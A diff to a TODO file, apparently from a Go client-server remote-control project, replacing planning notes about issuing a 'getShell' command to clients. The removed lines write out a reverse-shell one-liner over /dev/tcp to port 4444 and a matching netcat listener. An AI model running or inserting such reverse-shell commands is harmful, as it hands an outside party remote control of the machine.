@@ -1,9 +1,6 @@
 # Todo
 
-- Ill implement a netcat connection instead of creating a shell because thats a lot of work for no reason
-    - The idea is that the client will receive a "getShell" string and will connect to a nc connection from the server `sh -i >& /dev/tcp/127.0.0.1/4444 0>&1` (`getCommands` function)
-    - In the server, he will be waiting for a nc connection from the client IP (localhost for now) `nc -lvp 4444`
-    - For now this is a rev shell but the ideal was a bind shell , this way the client would wait for a connection from the server
+- Check the server code and check the TODO I was here, but basicaly I was searching for nc lib in go so I can connect to the rev shell
 
 - Server could exit but clients should continue running and when server starts again, goes check what clients are still on
 
